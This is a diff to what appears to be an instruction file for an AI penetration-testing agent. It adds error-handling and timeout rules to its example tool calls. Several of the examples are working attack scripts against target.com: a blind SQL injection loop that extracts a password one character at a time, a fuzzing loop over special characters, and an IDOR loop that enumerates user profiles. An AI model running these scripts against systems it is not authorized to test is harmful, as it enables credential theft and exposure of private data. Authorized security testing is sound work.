@@ -35,12 +35,18 @@
 
 **Important**: Do not use multiple `http_request` calls to simulate loops
 
+**python_exec Defensive Programming Constraints**: Any script using `requests` to make HTTP requests **must** adhere to the following rules. Scripts violating these rules are considered incorrect:
+1. **Status Code Check**: Always check `r.status_code` before reading response content.
+2. **JSON Parsing Resilience**: Never call `r.json()` directly. Wrap it in `try/except json.JSONDecodeError`, and fallback to `r.text` for manual parsing or raw content logging on failure.
+3. **Exception Handling**: All network requests must be wrapped in `try/except requests.RequestException` to prevent a single failure from crashing the entire script.
+4. **Timeout**: All `requests` calls must explicitly set the `timeout` parameter.
+
 **Example**:
 ```json
 {
   "tool": "python_exec",
   "params": {
-    "code": "import requests\nchars = ['a', 'b', 'c']\nfor char in chars:\n    r = requests.get(f'http://target.com/test?q={char}')\n    print(f'{char}: {r.status_code}')"
+    "code": "import requests, json\nchars = ['a', 'b', 'c']\nfor char in chars:\n    try:\n        r = requests.get(f'http://target.com/test?q={char}', timeout=10)\n        if r.status_code == 200:\n            try:\n                data = r.json()\n                print(f'{char}: JSON ok')\n            except json.JSONDecodeError:\n                print(f'{char}: status=200, not JSON, text={r.text[:100]}')\n        else:\n            print(f'{char}: status={r.status_code}')\n    except requests.RequestException as e:\n        print(f'{char}: request error={e}')"
   }
 }
 ```
@@ -143,10 +149,13 @@ result = ""
 for i in range(1, 20):
     for c in range(32, 127):
         payload = f"admin' AND ASCII(SUBSTR(password,{i},1))={c}--"
-        r = requests.get(f"http://target.com/login?user={payload}")
-        if "Welcome" in r.text:
-            result += chr(c)
-            break
+        try:
+            r = requests.get(f"http://target.com/login?user={payload}", timeout=10)
+            if r.status_code == 200 and "Welcome" in r.text:
+                result += chr(c)
+                break
+        except requests.RequestException as e:
+            print(f"Request error at i={i}, c={c}: {e}")
 print(f"Extracted: {result}")
 ```
 
@@ -160,8 +169,11 @@ print(f"Extracted: {result}")
 import requests
 chars = ["'", '"', '<', '>', '{', '}', ';', '|']
 for char in chars:
-    r = requests.get(f"http://target.com/search?q=test{char}test")
-    print(f"{char}: status={r.status_code}, len={len(r.text)}")
+    try:
+        r = requests.get(f"http://target.com/search?q=test{char}test", timeout=10)
+        print(f"{char}: status={r.status_code}, len={len(r.text)}")
+    except requests.RequestException as e:
+        print(f"{char}: request error={e}")
 ```
 
 ### Parameter Enumeration (IDOR)
@@ -173,9 +185,12 @@ for char in chars:
 ```python
 import requests
 for user_id in range(1, 100):
-    r = requests.get(f"http://target.com/profile?id={user_id}")
-    if r.status_code == 200 and "email" in r.text:
-        print(f"Found: id={user_id}")
+    try:
+        r = requests.get(f"http://target.com/profile?id={user_id}", timeout=10)
+        if r.status_code == 200 and "email" in r.text:
+            print(f"Found: id={user_id}")
+    except requests.RequestException as e:
+        print(f"Error at id={user_id}: {e}")
 ```
 
 ### Single Payload Verification
